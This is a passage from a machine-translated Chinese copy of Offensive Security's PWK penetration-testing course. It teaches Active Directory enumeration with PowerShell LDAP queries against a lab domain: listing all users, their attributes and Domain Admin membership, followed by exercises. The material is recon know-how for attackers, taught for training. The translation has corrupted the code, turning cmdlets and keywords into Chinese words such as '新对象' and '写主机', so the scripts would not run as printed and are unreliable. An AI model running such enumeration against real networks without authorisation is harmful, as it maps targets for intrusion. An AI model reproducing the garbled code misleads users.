<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:14560;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$SearchString = "LDAP://"</font></font></nobr></div>
<div style="position:absolute;top:14593;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$SearchString += $PDC + "/"</font></font></nobr></div>
<div style="position:absolute;top:14628;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"</font></font></nobr></div>
<div style="position:absolute;top:14661;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$SearchString += $DistinguishedName</font></font></nobr></div>
<div style="position:absolute;top:14695;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$Searcher = 新对象 System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)</font></font></nobr></div>
<div style="position:absolute;top:14729;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$objDomain = 新对象 System.DirectoryServices.DirectoryEntry</font></font></nobr></div>
<div style="position:absolute;top:14763;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$Searcher.SearchRoot = $objDomain</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:14797;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$Searcher.filter="samAccountType=805306368"</font></font></b></nobr></div>
<div style="position:absolute;top:14831;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$Searcher.FindAll()</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:14850;left:345"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 670 - 用于搜索用户的代码段</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:14880;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们已经通过</font><i><font style="vertical-align: inherit;">$Searcher</font></i><font style="vertical-align: inherit;">对象</font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.filter</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">属性</font><font style="vertical-align: inherit;">添加了 samAccountType 过滤器</font><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:14899;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后调用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FindAll</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">623</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进行搜索并找到给定配置的所有结果</font></font></nobr></div>
<div style="position:absolute;top:14919;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">筛选。</font></font></nobr></div>
<div style="position:absolute;top:14951;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行时，此脚本应枚举域中的所有用户：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:14986;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">小路    </font></font></nobr></div>
<div style="position:absolute;top:14986;left:668"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特性    </font></font></nobr></div>
<div style="position:absolute;top:15003;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----    </font></font></nobr></div>
<div style="position:absolute;top:15003;left:668"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----------    </font></font></nobr></div>
<div style="position:absolute;top:15020;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LDAP://CN=管理员,CN=用户,DC=corp,DC=com    </font></font></nobr></div>
<div style="position:absolute;top:15020;left:668"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{管理员计数...</font></font></nobr></div>
<div style="position:absolute;top:15037;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LDAP://CN=Guest,CN=Users,DC=corp,DC=com    </font></font></nobr></div>
<div style="position:absolute;top:15037;left:668"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{批评...</font></font></nobr></div>
<div style="position:absolute;top:15054;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LDAP://CN=DefaultAccount,CN=Users,DC=corp,DC=com    </font></font></nobr></div>
<div style="position:absolute;top:15054;left:668"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{批评...</font></font></nobr></div>
<div style="position:absolute;top:15071;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LDAP://CN=krbtgt,CN=用户,DC=corp,DC=com    </font></font></nobr></div>
<div style="position:absolute;top:15071;left:668"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{msds-...</font></font></nobr></div>
<div style="position:absolute;top:15088;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LDAP://CN=Offsec,OU=Admins,OU=CorpUsers,DC=corp,DC=com    </font></font></nobr></div>
<div style="position:absolute;top:15088;left:668"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{给定的名称...</font></font></nobr></div>
<div style="position:absolute;top:15105;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LDAP://CN=Jeff_Admin,OU=Admins,OU=CorpUsers,DC=corp,DC=com    </font></font></nobr></div>
<div style="position:absolute;top:15105;left:668"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{给定的名称...</font></font></nobr></div>
<div style="position:absolute;top:15122;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LDAP://CN=Adam,OU=Normal,OU=CorpUsers,DC=corp,DC=com    </font></font></nobr></div>
<div style="position:absolute;top:15122;left:668"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{给定的名称...</font></font></nobr></div>
<div style="position:absolute;top:15139;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LDAP://CN=iis_service,OU=ServiceAccounts,OU=CorpUsers,DC=corp,DC=com {givenname...</font></font></nobr></div>
<div style="position:absolute;top:15156;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LDAP://CN=sql_service,OU=ServiceAccounts,OU=CorpUsers,DC=corp,DC=com {givenname...</font></font></nobr></div>
<div style="position:absolute;top:15175;left:365"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 671 - 域中的用户</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:15205;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是很好的信息，但我们应该清理一下。</font><font style="vertical-align: inherit;">由于用户对象的属性是</font></font></nobr></div>
<div style="position:absolute;top:15224;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">存储在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Properties</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字段中，我们可以实现一个双循环，将每个属性打印在</font></font></nobr></div>
<div style="position:absolute;top:15243;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自己的线路。</font></font></nobr></div>
<div style="position:absolute;top:15276;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完整的 PowerShell 脚本将收集所有用户及其属性：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:15311;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()</font></font></nobr></div>
<div style="position:absolute;top:15345;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$PDC = ($domainObj.PdcRoleOwner).Name</font></font></nobr></div>
<div style="position:absolute;top:15379;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$SearchString = "LDAP://"</font></font></nobr></div>
<div style="position:absolute;top:15413;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$SearchString += $PDC + "/"</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:15477;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">623 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:15492;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">us/dotnet/api/system.directoryservices.directorysearcher.findall?view=netframework-4.8 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:15619;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="14"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 14 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:15652;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:16729;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:16729;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:16729;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">631</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:15764;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"</font></font></nobr></div>
<div style="position:absolute;top:15798;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$SearchString += $DistinguishedName</font></font></nobr></div>
<div style="position:absolute;top:15832;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$Searcher = 新对象 System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)</font></font></nobr></div>
<div style="position:absolute;top:15866;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$objDomain = 新对象 System.DirectoryServices.DirectoryEntry</font></font></nobr></div>
<div style="position:absolute;top:15900;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$Searcher.SearchRoot = $objDomain</font></font></nobr></div>
<div style="position:absolute;top:15934;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$Searcher.filter="samAccountType=805306368"</font></font></nobr></div>
<div style="position:absolute;top:15968;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$Result = $Searcher.FindAll()</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:16002;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Foreach($结果中的$obj)</font></font></b></nobr></div>
<div style="position:absolute;top:16019;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{</font></font></b></nobr></div>
<div style="position:absolute;top:16036;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Foreach($obj.Properties 中的 $prop)</font></font></b></nobr></div>
<div style="position:absolute;top:16053;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{</font></font></b></nobr></div>
<div style="position:absolute;top:16070;left:174"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$prop</font></font></b></nobr></div>
<div style="position:absolute;top:16087;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></b></nobr></div>
<div style="position:absolute;top:16121;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">写主机“------------------------”</font></font></b></nobr></div>
<div style="position:absolute;top:16138;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:16157;left:307"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 672 - 枚举所有用户的 PowerShell 脚本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:16187;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于用户对象具有许多属性，因此检索到的信息可能非常庞大。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:16206;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下面的清单显示了 Jeff_Admin 用户属性的部分视图。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:16241;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">给定的名称    </font></font></nobr></div>
<div style="position:absolute;top:16241;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{杰夫_管理员}</font></font></nobr></div>
<div style="position:absolute;top:16258;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">同名    </font></font></nobr></div>
<div style="position:absolute;top:16258;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{jeff_admin}</font></font></nobr></div>
<div style="position:absolute;top:16275;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cn    </font></font></nobr></div>
<div style="position:absolute;top:16275;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{杰夫_管理员}</font></font></nobr></div>
<div style="position:absolute;top:16292;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码组    </font></font></nobr></div>
<div style="position:absolute;top:16292;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{131623291900859206}</font></font></nobr></div>
<div style="position:absolute;top:16309;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建时    </font></font></nobr></div>
<div style="position:absolute;top:16309;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{05/02/2018 18.33.10}</font></font></nobr></div>
<div style="position:absolute;top:16326;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">badpwdcount    </font></font></nobr></div>
<div style="position:absolute;top:16326;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{0}</font></font></nobr></div>
<div style="position:absolute;top:16343;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示名称    </font></font></nobr></div>
<div style="position:absolute;top:16343;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{杰夫_管理员}</font></font></nobr></div>
<div style="position:absolute;top:16360;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后登录    </font></font></nobr></div>
<div style="position:absolute;top:16360;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{0}</font></font></nobr></div>
<div style="position:absolute;top:16376;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">相同帐户类型    </font></font></nobr></div>
<div style="position:absolute;top:16376;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{805306368}</font></font></nobr></div>
<div style="position:absolute;top:16393;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">国家代码    </font></font></nobr></div>
<div style="position:absolute;top:16393;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{0}</font></font></nobr></div>
<div style="position:absolute;top:16411;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对象引导    </font></font></nobr></div>
<div style="position:absolute;top:16411;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{130 114 89 75 220 233 3 76 170 206 193 232 122 112 176 32}</font></font></nobr></div>
<div style="position:absolute;top:16428;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">改变了    </font></font></nobr></div>
<div style="position:absolute;top:16428;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{12938}</font></font></nobr></div>
<div style="position:absolute;top:16444;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">何时改变    </font></font></nobr></div>
<div style="position:absolute;top:16444;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{05/02/2018 19.20.52}</font></font></nobr></div>
<div style="position:absolute;top:16461;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称    </font></font></nobr></div>
<div style="position:absolute;top:16461;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{杰夫_管理员}</font></font></nobr></div>
<div style="position:absolute;top:16478;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对象标识    </font></font></nobr></div>
<div style="position:absolute;top:16478;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{1 5 0 0 0 0 0 5 21 0 0 0 195 240 137 95 239 58 38 166 116 233</font></font></nobr></div>
<div style="position:absolute;top:16495;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登录次数    </font></font></nobr></div>
<div style="position:absolute;top:16495;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{0}</font></font></nobr></div>
<div style="position:absolute;top:16512;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码错误时间    </font></font></nobr></div>
<div style="position:absolute;top:16512;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{0}</font></font></nobr></div>
<div style="position:absolute;top:16529;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">帐户到期    </font></font></nobr></div>
<div style="position:absolute;top:16529;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{9223372036854775807}</font></font></nobr></div>
<div style="position:absolute;top:16546;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主组ID    </font></font></nobr></div>
<div style="position:absolute;top:16546;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{513}</font></font></nobr></div>
<div style="position:absolute;top:16563;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对象类别    </font></font></nobr></div>
<div style="position:absolute;top:16563;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{CN=Person,CN=Schema,CN=Configuration,DC=corp,DC=com}</font></font></nobr></div>
<div style="position:absolute;top:16580;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户名 {jeff_admin@corp.com}</font></font></nobr></div>
<div style="position:absolute;top:16597;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户帐户控制{66048}</font></font></nobr></div>
<div style="position:absolute;top:16614;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理员人数    </font></font></nobr></div>
<div style="position:absolute;top:16614;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{1}</font></font></nobr></div>
<div style="position:absolute;top:16631;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dscorepropagationdata {05/02/2018 19.20.52, 01/01/1601 00.00.00}</font></font></nobr></div>
<div style="position:absolute;top:16648;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">专有名称 {CN=Jeff_Admin,OU=Admins,OU=CorpUsers,DC=corp,DC=com}</font></font></nobr></div>
<div style="position:absolute;top:16665;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对象类    </font></font></nobr></div>
<div style="position:absolute;top:16665;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{顶部，人，组织人，用户}</font></font></nobr></div>
<div style="position:absolute;top:16682;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们创造的    </font></font></nobr></div>
<div style="position:absolute;top:16682;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{12879} </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:16807;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="15"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 15 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:16840;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:17917;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:17917;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:17917;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">632</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:16936;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成员    </font></font></nobr></div>
<div style="position:absolute;top:16936;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{CN=域管理员,CN=用户,DC=corp,DC=com}</font></font></nobr></div>
<div style="position:absolute;top:16952;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">广告路径    </font></font></nobr></div>
<div style="position:absolute;top:16952;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{LDAP://CN=Jeff_Admin,OU=Admins,OU=CorpUsers,DC=corp,DC=com}</font></font></nobr></div>
<div style="position:absolute;top:16969;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:16989;left:323"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 673 - 所有用户和相关属性</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:17018;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据上面的输出，Jeff_Admin 帐户是 Domain Admins 组的成员。</font></font></nobr></div>
<div style="position:absolute;top:17038;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用我们的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DirectorySearcher</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对象，我们可以使用过滤器来定位特定组的成员，例如</font></font></nobr></div>
<div style="position:absolute;top:17057;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域管理员，或使用过滤器专门搜索 Jeff_Admin 用户。</font></font></nobr></div>
<div style="position:absolute;top:17090;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在过滤器属性中，我们可以设置我们想要的对象类型的任何属性。</font><font style="vertical-align: inherit;">例如，我们可以使用</font></font></nobr></div>
<div style="position:absolute;top:17109;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">属性来创建用于Jeff_Admin用户的滤波器如下图所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:17144;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$Searcher.filter="name=Jeff_Admin"</font></font></nobr></div>
<div style="position:absolute;top:17163;left:331"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 674 - 将结果过滤为仅 Jeff_Admin</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:17192;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然这个脚本一开始可能看起来令人生畏，但它非常灵活，可以修改以帮助</font></font></nobr></div>
<div style="position:absolute;top:17212;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与其他 AD 枚举任务。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:17246;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.2.2.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:17276;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 修改 PowerShell 脚本以仅返回 Domain Admins 组的成员。</font></font></nobr></div>
<div style="position:absolute;top:17305;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 修改 PowerShell 脚本以返回域中的所有计算机。</font></font></nobr></div>
<div style="position:absolute;top:17333;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 添加过滤器以仅返回运行 Windows 10 的计算机。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:17368;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.2.3</font></font></i></nobr></div>
<div style="position:absolute;top:17368;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">解析嵌套组</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:17406;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，让我们使用我们新开发的 PowerShell 脚本来解开我们遇到的嵌套组</font></font></nobr></div>
<div style="position:absolute;top:17425;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">net.exe 时</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
<div style="position:absolute;top:17458;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第一个任务是定位域中的所有组并打印它们的名称。</font><font style="vertical-align: inherit;">为此，我们将创建</font></font></nobr></div>
<div style="position:absolute;top:17477;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个过滤器提取所有</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对象类</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">624</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置为“组”的记录，我们将只打印</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称</font></font></i></nobr></div>
<div style="position:absolute;top:17497;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">每个组的属性而不是所有属性。</font></font></nobr></div>
<div style="position:absolute;top:17529;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 675 显示了修改后的脚本，其中突出显示了更改。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:17564;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()</font></font></nobr></div>
<div style="position:absolute;top:17598;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$PDC = ($domainObj.PdcRoleOwner).Name</font></font></nobr></div>
<div style="position:absolute;top:17632;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$SearchString = "LDAP://"</font></font></nobr></div>
<div style="position:absolute;top:17666;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$SearchString += $PDC + "/"</font></font></nobr></div>
<div style="position:absolute;top:17700;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"</font></font></nobr></div>
<div style="position:absolute;top:17734;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$SearchString += $DistinguishedName</font></font></nobr></div>
<div style="position:absolute;top:17768;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$Searcher = 新对象 System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)</font></font></nobr></div>
